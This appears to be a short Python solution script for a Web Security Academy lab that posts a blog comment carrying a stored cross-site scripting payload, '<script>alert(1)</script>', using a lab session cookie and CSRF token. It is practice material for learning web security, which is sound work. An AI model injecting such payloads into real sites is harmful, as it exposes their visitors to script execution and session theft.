import requests
import json

url = "https://0a720010042b47dec3760b9a0017006e.web-security-academy.net/post/comment"
headers = {"Cookie" : "session=2z28G40ZcEpWMxWjrLfbc2gzdd3g9F2U"}
data = {'csrf' : 'z6nuTy6p1CpG23M3FkspdsRODtKbSi79', 'postId' : '10', 'comment' : '<script>alert(1)</script>', 'name' : 'st0rm', 'email' : 'sssss%@gmail.com', 'website' : 'https://attacker.com'}
solution = requests.post(url, data=data, headers=headers)

print(solution.content)